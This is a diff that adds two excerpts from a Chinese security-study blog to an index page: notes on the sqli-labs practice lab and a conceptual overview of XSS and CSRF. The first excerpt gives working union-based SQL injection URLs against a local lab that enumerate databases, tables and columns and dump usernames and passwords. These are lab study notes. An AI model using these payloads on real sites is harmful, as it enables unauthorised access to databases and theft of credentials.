@@ -156,6 +156,149 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-sql注入" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/07/20/sql注入/">sql注入</a>
+    </h1>
+  
+
+        
+        <a href="/2019/07/20/sql注入/" class="archive-article-date">
+  	<time datetime="2019-07-20T08:24:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-20</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>常用的系统函数<br>1.version() –mysql版本<br>2.user() –数据库用户名<br>3.database() – 数据库名<br>4.@@datadir –数据库路径<br>5.@@version_compile_os –操作系统版本<br>字符串连接符号 group_concat(Str1,str2,…) 连接一个组的所有字符串，并以逗号分隔每一条数据</p>
+<hr>
+<p>##sqli-labs-master##</p>
+<p>###Less1###<br>爆所有的数据库名  127.0.0.1/sqli-labs-master/Less-1/?id=-1’ union select 1,group_concat(schema_name),3 from information_schema.schemata%23</p>
+<p>库名：information_schema,�����ݿ�,challenges,dedecmsv57utf8sp2,dvwa,mysql,performance_schema,security,test,wordpress</p>
+<p>爆表名  127.0.0.1/sqli-labs-master/Less-1/?id=-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’ –+<br>表名：emails,referers,uagents,users</p>
+<p>爆列名：127.0.0.1/sqli-labs-master/Less-1/?id=-1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’ –+</p>
+<p>爆数据 127.0.0.1/sqli-labs-master/Less-1/?id=-1’ union select 1,username,password from users where id=2–+</p>
+<p>###Less2</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/07/20/sql注入/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-drops夏令营14" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/07/20/drops夏令营14/">WEB前端安全-XSS与CSRF</a>
+    </h1>
+  
+
+        
+        <a href="/2019/07/20/drops夏令营14/" class="archive-article-date">
+  	<time datetime="2019-07-20T07:11:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-20</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>XSS<br>  XSS，Cross Site Script，即跨站脚本攻击；XSS攻击通常指黑客通过“HTML”注入篡改了网页，插入了恶意的脚本，从而在浏览网页时，控制用户浏览器的一种攻击。<br>XSS根据效果的不同可以分为以下三类：</p>
+<p>   反射型XSS，也叫做“非持久型XSS”，只是简单的把用户输入的数据“反射”给浏览器；</p>
+<p>   存储型XSS，也叫做“持久型XSS”，会把用户输入的数据“存储在”服务器端。常见的场景是，黑客写下一篇含有恶意JavaScript代码的博客文章，文章发表后，所有访问该博客文章的用户，都会在他们的浏览器中执行这段恶意的JavaScript代码；</p>
+<p>   DOM Based XSS，从效果来说也是反射型XSS，单独划分出了是因为DOM Based XSS的形成原因比较特殊，通过修改页面的DOM节点形成的XSS</p>
+<p>XSS常见危害：<br>劫持用户会话<br>盗取cookie<br>钓鱼欺骗<br>强制弹出广告<br>提升用户权限<br>传播跨站脚本蠕虫</p>
+<hr>
+<p>CSRF<br>CSRF，Cross Site Request Forgery，即跨站点请求伪造；<br>它是一种常见的Web攻击，也是Web安全中最容易被忽略的一种攻击方式<br>它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户的请求来利用受信任的网站。</p>
+<p>一般攻击方式为攻击者诱使用户访问了一个页面，就以该用户身份在第三方站点里执行了一次操作</p>
+<p>CSRF攻击的两个重点</p>
+<p>*CSRF的攻击建立在浏览器与web服务器的会话中<br>*欺骗用户访问URL</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/07/20/drops夏令营14/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-drops夏令营11" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
